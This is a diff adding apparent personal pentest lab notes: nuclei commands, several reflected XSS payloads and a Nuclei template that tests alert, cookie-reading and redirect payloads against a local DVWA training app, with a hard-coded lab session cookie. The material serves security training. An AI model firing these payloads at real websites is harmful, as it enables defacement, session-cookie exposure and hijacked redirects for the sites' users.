@@ -1,0 +1,114 @@
+
+
+nuclei -t ~/pentest/dvwa/templates/XSS_TuTuXinhXich.yaml -validate
+
+nuclei -t ~/pentest/dvwa/templates/XSS_TuTuXinhXich.yaml \
+       -u http://localhost:4280 \
+       -v
+
+
+
+nano ~/pentest/dvwa/templates/XSS_TuTuXinhXich.yaml
+
+khai thac:
+
+<svg onload=alert('XSS!')>
+
+<svg onload=alert('Ban_Da_Bi_Hack!!')>
+
+<svg onload=alert(document.cookie)>
+
+<svg onload=document.body.innerHTML='<h1>Website bi hack!</h1>'>
+<svg onload=window.location='https://google.com'>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+id: XSS_TuTuXinhXich
+
+info:
+  name: DVWA Reflected XSS - Custom Payloads
+  author: duc-hung
+  severity: high
+  description: |
+    DVWA Reflected XSS vulnerable endpoint.
+    Test 3 payloads: alert, cookie steal, redirect.
+  tags: dvwa,xss,reflected,lab
+
+variables:
+  target_param: "name"
+
+http:
+  # == PAYLOAD 1: Alert đơn giản ==
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_r/?name=<svg+onload=alert('Ban_Da_Bi_Hack!!')>&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=d7b2332f69736b873dbdb1c5363b5cab; security=low"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg onload=alert('Ban_Da_Bi_Hack!!')"
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: xss_payload_reflected
+        regex:
+          - "svg onload=alert\\('Ban_Da_Bi_Hack'\\)"
+
+  # == PAYLOAD 2: Đọc Cookie ==
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_r/?name=<svg+onload=alert(document.cookie)>&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=d7b2332f69736b873dbdb1c5363b5cab; security=low"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg onload=alert(document.cookie)"
+      - type: status
+        status:
+          - 200
+
+  # == PAYLOAD 3: Redirect ==
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_r/?name=<svg+onload=window.location='https://google.com'>&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=d7b2332f69736b873dbdb1c5363b5cab; security=low"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg onload=window.location="
+      - type: status
+        status:
+          - 200
